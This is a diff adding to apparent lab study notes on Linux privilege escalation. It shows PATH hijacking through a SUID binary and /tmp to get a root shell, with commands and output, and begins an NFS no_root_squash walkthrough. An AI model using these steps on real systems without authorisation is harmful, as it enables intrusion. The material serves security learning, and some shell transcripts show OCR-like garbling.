@@ -46,7 +46,7 @@ Matching Default entries for user on this host:
 
 LD_PRELOAD is a function that allows any program to *use shared libraries*. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
 
-The steps of this privilege escalation vector can be summarized as follows;
+The steps of this privilege escalation vector can be summarised as follows;
 
  1. Check for LD_PRELOAD (with the env_keep option)
  2. Write a simple C code compiled as a share object (.so extension) file
@@ -230,4 +230,131 @@ If we type “`thm`” to the command line, these are the locations Linux will l
 2. Does your current user have write privileges for any of these folders?
 3. Can you modify $PATH?
 4. Is there a script/application you can start that will be affected by this vulnerability?
+
+For demo purposes, consider the script below:
+
+```C
+#include<unistd.h>
+void main()
+{setuid(0);
+ setgid(0);
+ system("thm");
+}
+```
+
+This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
+
+We compile this into an executable and set the SUID bit.
+
+```bash
+root@targetsystem:/home/alper/Desktop# gcc path_exp.c -o path -w
+root@targetsystem:/home/alper/Desktop# chmod u+s path
+root@targetsystem:/home/alper/Desktop# ls -l
+total 24
+-rwsr-xr-x 1 root root 16792 Jun 17 07:02 path
+-rw-rw-r-- 1 alper alper 76 Jun 17 06:53 path_exp.c
+root@targetsystem:/home/alper/Desktop#
+```
+
+Our user now has access to the “path” script with SUID bit set.
+
+```bash
+alper@targetsystem:~/Desktop$ 1s -1
+total 24
+-rwsr-xr-x 1 root root 16792 Jun 17 07:02 path
+-rw-rw-r-- 1 alper alper 76 Jun 17 06:53 path_exp.c
+```
+
+Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
+
+If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
+
+A simple search for writable folders can done using the `find / -writable 2>/dev/null` command. The output of this command can be cleaned using a simple cut and sort sequence.
+
+```bash
+alperatargetsystem:~/Desktop$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u 
+dev 
+home 
+proc 
+run 
+snap 
+sys
+tmp
+usr 
+var
+alperatargetsystem:~/Desktop$ |
+```
+
+An alternative could be the command below.
+
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+The “grep -v proc” is to get rid of the many results related to running processes. Unfortunately, subfolders under */usr are not writable*
+
+The folder that will be easier to write to is probably `/tmp`. At this point because `/tmp `is not present in PATH so *we will need to add it*. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.
+
+At this point the path script will also look under the /tmp folder for an executable named “thm”.
+
+Creating this command is fairly easy by copying `/bin/bash` as “thm” under the /tmp folder.
+
+```bash
+alperatargetsystem:/$ cd /tmp 
+alperatargetsystem:/tmp$ echo "/bin/bash" > thm 
+alperatargetsystem:/tmp$ chmod 777 thm
+alperatargetsystem:/tmp$ ls -1 
+thm -rwxrwxrwx 1 alper alper 10 Jun 17 14:36 thm
+```
+
+We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
+
+```bash
+alperatargetsystem:~/Desktop$ whoami
+alper
+alperatargetsystem:~/Desktop$ id
+uid=1000(alper) gid=1000(alper) groups=1000(alper), 4(adm),24(cdrom),27 (sudo),30(dip),46(plugdev),120(padmin), 131(1xd), 132(sambashare) alperatargetsystem:~/Desktop$ ./path
+rootatargetsystem:~/Desktop# whoami
+root
+rootatargetsystem:~/Desktop# id
+uid=0(root) gid=0(root) groups=0(root), 4(adm),24(cdrom),27 (sudo),30(dip),46(plugdev),120(padmin), 131(1xd), 132(sambashare), 1000(alper)
+root@targetsystem: ~/Desktop#
+```
+
+### NFS
+
+NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.
+
+```bash
+$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+The critical element for this privilege escalation vector is the “**no_root_squash**” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. 
+
+If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+We will start by enumerating mountable shares from our attacking machine.
+
+```bash
+$ showmount -e 10.10.115.52
+Export list for 10.10.115.52:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
 
